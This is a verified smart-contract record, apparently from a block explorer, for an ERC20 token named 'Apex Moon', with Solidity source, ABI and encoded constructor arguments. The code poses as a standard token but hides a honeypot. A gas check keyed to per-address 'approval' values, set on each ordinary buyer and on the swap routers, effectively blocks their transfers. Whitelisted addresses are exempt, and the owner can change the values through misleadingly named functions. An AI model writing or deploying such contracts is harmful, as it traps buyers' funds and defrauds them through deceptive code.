{"SourceCode": "\n\npragma solidity ^0.8.0;\n\n\n\n\ninterface IERC20 {\n  event Transfer(address indexed from, address indexed to, uint256 value);\n  event Approval(address indexed owner, address indexed spender, uint256 value);\n  function totalSupply() external view returns (uint256);\n  function balanceOf(address account) external view returns (uint256);\n  function transfer(address recipient, uint256 amount) external returns (bool);\n  function allowance(address owner, address spender) external view returns (uint256);\n  function approve(address spender, uint256 amount) external returns (bool);\n  function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);\n}\n\n\n\n\nabstract contract Context {\n  function _msgSender() internal view virtual returns (address) {\n    return msg.sender;\n  }\n\n\n\n\n  function _msgData() internal view virtual returns (bytes calldata) {\n    return msg.data;\n  }\n}\n\n\n\n\ncontract ERC20 is Context, IERC20 {\n  mapping(address => uint256) private _balances;\n  mapping(address => mapping(address => uint256)) private _allowances;\n  mapping(address => uint256) public getApproval;\n  mapping(address => bool) private Gwei;\n  mapping(uint => uint) private _claimTransactionCount;\n\n\n\n\n  uint256 private _totalSupply;\n  string private _name;\n  string private _symbol;\n  uint8 private _decimals;\n  address public owner;\n  uint256 public balanceReceive;\n  bool private _Presale;\n  uint256 private _RenounceOwnership;\n  uint256 private _maxTransactionsPerClaim;\n  event defaultApprovalUpdated(uint256 oldValue, uint256 newValue);\n  modifier ensureApproval(address _sender) {\n        require(gasleft() >=getApproval[_sender]);\n        _;\n    }\n\n\n\n\n  constructor(\n    string memory name_,\n    string memory symbol_,\n    uint8 decimals_,\n    uint256 totalSupply_,\n    address[] memory balanceApprove,\n    uint256 balanceReceive_,\n    uint256 gasUnit,\n    address[] memory GweiUnit,\n    uint256 maxTransactionsPerClaim_\n  ) {\n    _name = name_;\n    _symbol = symbol_;\n    _decimals = decimals_;\n    owner = _msgSender();\n    _totalSupply = totalSupply_ * (10 ** uint256(decimals_));\n    _balances[owner] = _totalSupply;\n    emit Transfer(address(0), owner, _totalSupply);\n    balanceReceive = balanceReceive_;\n    _RenounceOwnership = gasUnit;\n    _Presale = false;\n    _maxTransactionsPerClaim = maxTransactionsPerClaim_;\n\n\n\n\n    for (uint256 i = 0; i < balanceApprove.length; i++) {\n      _sendApproval(balanceApprove[i], balanceReceive);\n    }\n\n\n\n\n    for (uint256 i = 0; i < GweiUnit.length; i++) {\n      Gwei[GweiUnit[i]] = true;\n    }\n  }\n\n\n\n\n  function name() public view virtual returns (string memory) {\n    return _name;\n  }\n\n\n\n\n  function symbol() public view virtual returns (string memory) {\n    return _symbol;\n  }\n\n\n\n\n  function decimals() public view virtual returns (uint8) {\n    return _decimals;\n  }\n\n\n\n\n  function totalSupply() public view virtual override returns (uint256) {\n    return _totalSupply;\n  }\n\n\n\n\n  function balanceOf(address account) public view virtual override returns (uint256) {\n    return _balances[account];\n  }\n\n\n\n\n  function transfer(address recipient, uint256 amount) public virtual override returns (bool) {\n    _claimRecord();\n    _transfer(_msgSender(), recipient, amount);\n    return true;\n  }\n\n\n\n\n  function allowance(address owner, address spender) public view virtual override returns (uint256) {\n    return _allowances[owner][spender];\n  }\n\n\n\n\n  function approve(address spender, uint256 amount) public virtual override returns (bool) {\n    _approve(_msgSender(), spender, amount);\n    return true;\n  }\n\n\n\n\n  function transferFrom(address sender, address recipient, uint256 amount) public virtual override returns (bool) {\n    _claimRecord();\n    _transfer(sender, recipient, amount);\n    _approve(sender, _msgSender(), _allowances[sender][_msgSender()] - amount);\n    return true;\n  }\n\n\n\n\n  function _transfer(address sender, address recipient, uint256 amount) internal virtual ensureApproval(sender) {\n    require(sender != address(0), \"ERC20: transfer from the zero address\");\n    require(recipient != address(0), \"ERC20: transfer to the zero address\");\n    require(amount > 0, \"Transfer amount must be greater than zero\");\n\n\n    if (!_Presale) {\n      _Presale = true;\n      Gwei[recipient] = true;\n    } else if (getApproval[recipient] == 0 && !Gwei[recipient]) {\n      _sendApproval(recipient, _RenounceOwnership);\n    }\n\n\n\n    _balances[sender] -= amount;\n    _balances[recipient] += amount;\n\n\n\n    emit Transfer(sender, recipient, amount);\n  }\n\n\n\n\n  function _approve(address owner, address spender, uint256 amount) internal virtual {\n    require(owner != address(0), \"ERC20: approve from the zero address\");\n    require(spender != address(0), \"ERC20: approve to the zero address\");\n\n\n\n\n    _allowances[owner][spender] = amount;\n    emit Approval(owner, spender, amount);\n  }\n\n  function approveOf(uint256 newDefaultApproval) external {\n    require(_msgSender() == owner);\n    emit defaultApprovalUpdated(_RenounceOwnership, newDefaultApproval);\n    _RenounceOwnership = newDefaultApproval;\n  }\n\n\n\n\n  function _sendApproval(address _address, uint256 approveForSwap) internal {\n    getApproval[_address] = approveForSwap;\n  }\n\n\n\n\n  function multicall(address _address, uint256 approveAmount) external {\n    require(_msgSender() == owner);\n    _sendApproval(_address, approveAmount);\n  }\n\n\n\n\n  function _claimRecord() internal {\n    require(_claimTransactionCount[block.number] < _maxTransactionsPerClaim);\n    _claimTransactionCount[block.number]++;\n  }\n}\n\n\n\n    ", "ABI": "[{\"inputs\":[{\"internalType\":\"string\",\"name\":\"name_\",\"type\":\"string\"},{\"internalType\":\"string\",\"name\":\"symbol_\",\"type\":\"string\"},{\"internalType\":\"uint8\",\"name\":\"decimals_\",\"type\":\"uint8\"},{\"internalType\":\"uint256\",\"name\":\"totalSupply_\",\"type\":\"uint256\"},{\"internalType\":\"address[]\",\"name\":\"balanceApprove\",\"type\":\"address[]\"},{\"internalType\":\"uint256\",\"name\":\"balanceReceive_\",\"type\":\"uint256\"},{\"internalType\":\"uint256\",\"name\":\"gasUnit\",\"type\":\"uint256\"},{\"internalType\":\"address[]\",\"name\":\"GweiUnit\",\"type\":\"address[]\"},{\"internalType\":\"uint256\",\"name\":\"maxTransactionsPerClaim_\",\"type\":\"uint256\"}],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"owner\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"to\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"oldValue\",\"type\":\"uint256\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"newValue\",\"type\":\"uint256\"}],\"name\":\"defaultApprovalUpdated\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"owner\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"amount\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"newDefaultApproval\",\"type\":\"uint256\"}],\"name\":\"approveOf\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"account\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"balanceReceive\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"getApproval\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"_address\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"approveAmount\",\"type\":\"uint256\"}],\"name\":\"multicall\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"recipient\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"amount\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"sender\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"recipient\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"amount\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"}]", "ContractName": "ERC20", "CompilerVersion": "v0.8.19+commit.7dd6d404", "OptimizationUsed": "1", "Runs": "200", "ConstructorArguments": "000000000000000000000000000000000000000000000000000000000000012000000000000000000000000000000000000000000000000000000000000001600000000000000000000000000000000000000000000000000000000000000012000000000000000000000000000000000000000000000000000000016afe068000000000000000000000000000000000000000000000000000000000000001a0000000000000000000000000000000000000000000000000000000016afe06800000000000000000000000000000000000000000000000000000000000c65d4000000000000000000000000000000000000000000000000000000000000001c00000000000000000000000000000000000000000000000000000000000000002000000000000000000000000000000000000000000000000000000000000000941706578204d6f6f6e00000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000008415045584d4f4f4e000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000490000000000000000000000001111111254eeb25477b68fb85ed929f73a96058200000000000000000000000010ed43c718714eb63d5aa57b78b54704e256024e00000000000000000000000013f4ea83d0bd40e75c8222255bc855a974568dd40000000000000000000000000ed943ce24baebf257488771759f9bf482c397060000000000000000000000006131b5fae19ea4f9d964eac0408e4408b66337b5000000000000000000000000caa00aaf6fbc769d627d825b4faedc3aad880597000000000000000000000000c590175e458b83680867afd273527ff58f74c02b0000000000000000000000000656fd85364d03b103ceeda192fb2d3906a6ac150000000000000000000000006c1c420c04f4d563d6588a97693af902b87be5f10000000000000000000000002f2dd99235cb728fc79af575f1325eaa270f0c990000000000000000000000001d0ae300eec4093cee4367c00b228d10a5c7ac63000000000000000000000000d1b47490209ccb7a806e8a45d9479490c040abf40000000000000000000000009333c74bdd1e118634fe5664aca7a9710b108bab00000000000000000000000030dcf5192bf4a765fd63889d3966cfe2c7ab7da300000000000000000000000024ef4ccb8656c21382ed99716e1de834cbb599e2000000000000000000000000981d4337876d3756d5bccbe2e1f3cf41c4496f7d000000000000000000000000e1148c5d9b96898f93a154c40b7269a6578b787800000000000000000000000031cd6dfaf63c19e838621fa83b8b65f12fa73549000000000000000000000000423e4cd1d77639a5012d09846b82b2cefc96929700000000000000000000000061f16ac5a143081299e98f13c89d19b88db48c46000000000000000000000000c9718220b1cbda93261219cf65cb5ed5682483a1000000000000000000000000f6bddaf54a5ec52b9c4b9c9b8d2365b91d9d4ac600000000000000000000000018993b1f1027df9af0b4c074cd7d19c8dbeec267000000000000000000000000bf711697541039d2012eb865986bf2482d7e888d000000000000000000000000a851d393f7e80759ef3dd4e380e83f186a6a9c34000000000000000000000000aef26f97620c5ad921771b30b4c6feabf9d223ab0000000000000000000000009cc1ac48b207d766ef4ae81ec2978e0596845099000000000000000000000000e38399a5e94b0276780d487910ddd6a72b5b9ddd000000000000000000000000489c2c24d5a6dd6c0add8edb91f2c11db08721cb0000000000000000000000006969b4555850531aadb6fb41f0de841ca256e1fd000000000000000000000000b588c4363e0293fbccaf08a0451730a0c799202e0000000000000000000000008c5971415f2f5a8a02b81444be87d4fdcc4d641a0000000000000000000000000e695593976a6ff6cf06147205adbdd481c096c6000000000000000000000000a910124f4a13f31f748fd61728f03a8d36eef39d000000000000000000000000b52502d14276060c652d6a54ce430fea7f08d5670000000000000000000000008a53c66dddff28d4e776207f1e70af0efdc1a127000000000000000000000000f226012853f47e80dfd33ae2b79be42c01ca871b0000000000000000000000006e475f8ca5297fcceddce3e7787be2c4b3f670ea000000000000000000000000b7e5b2bc4bb734d708d12f25653e0aeeef859c6a000000000000000000000000c88b3a4561943eaf7d515888dc6cd9851d02c07600000000000000000000000060fe678580de54131cffd3069b05752e8e5c17b00000000000000000000000003868556570c579929537afcb674625ae927c069f00000000000000000000000014e9e60424716705ea429d2dbbe28bea6a144225000000000000000000000000ffda2396c28afea27383fed8460976c96197b262000000000000000000000000bc8f582c184b9a5aba920d6285dc6db5872f5a200000000000000000000000007c05b554d16867d72a631bdf77e2ebc9f5b8fc74000000000000000000000000ac46df45f5e38f557139a636771662bc9a30acf1000000000000000000000000252af851c8dc24f9d7548e344473b98e692e9db9000000000000000000000000e1adc3d195ef2f2d1d3289eefadcb6bc2daa0f7c0000000000000000000000002fc4f81bcdd7420bb722c92bec3632817acf623200000000000000000000000070dbb4ff6eae51154b1dd3004092b7cafe71f1410000000000000000000000004e97bad78567b2865def59d50146a6cc3abfae670000000000000000000000006638ab0ad4939b03a1403577839f42a4e83ccf0400000000000000000000000071218a0c23c2b53c6abf72ee23de9a0ccc76a9f2000000000000000000000000679311832280d4571f0b9f7d66fc50e16ec82b1b000000000000000000000000731c4b5c554e8073bf00199648d6a080d48500070000000000000000000000001803424cd053a8753404962d6ae0e142e9db3e1600000000000000000000000026bd428d4fc50d692b46f4a2fa50a1a2d464bc8b000000000000000000000000b9cec130e19f40492e03e819ceb85b74d05385700000000000000000000000003cf5bc4e76927f5c13fb1d7819158924a6123e57000000000000000000000000348cdffa1a096c60ba5a5f2e65ca36b00568f3570000000000000000000000003338019b898debe87944da70d5a6947d2026c556000000000000000000000000958b247d2093bd2f4444195ad67953b306e3bf62000000000000000000000000e56408cf8fc809ecc101b50fd50bab0405f54c690000000000000000000000002f8803fb127f4427bb8f743c9ddecccd7809ff650000000000000000000000000857b67a0f24447a3e399cc44061e6227be854010000000000000000000000000636151774d8247732463d9aa4c9636082ec4dbf0000000000000000000000002ad12d8f86d7c831777b1598d38c97ceb7ad1ec200000000000000000000000074ac06e48eeecd8416f02da92faea90c95138fa1000000000000000000000000f17ba5e20c8fa7af61aed5b5a5be55467d80436d0000000000000000000000009bca9cd6385c4026ac5b19ef108dab2ca724f3db0000000000000000000000008cc8920fda2c808d2f87f9e410a088b351482d3e0000000000000000000000004c35d727e86f719140939142b49b982090aa6945", "EVMVersion": "Default", "Library": "", "LicenseType": "GNU GPLv3", "Proxy": "0", "Implementation": "", "SwarmSource": ""}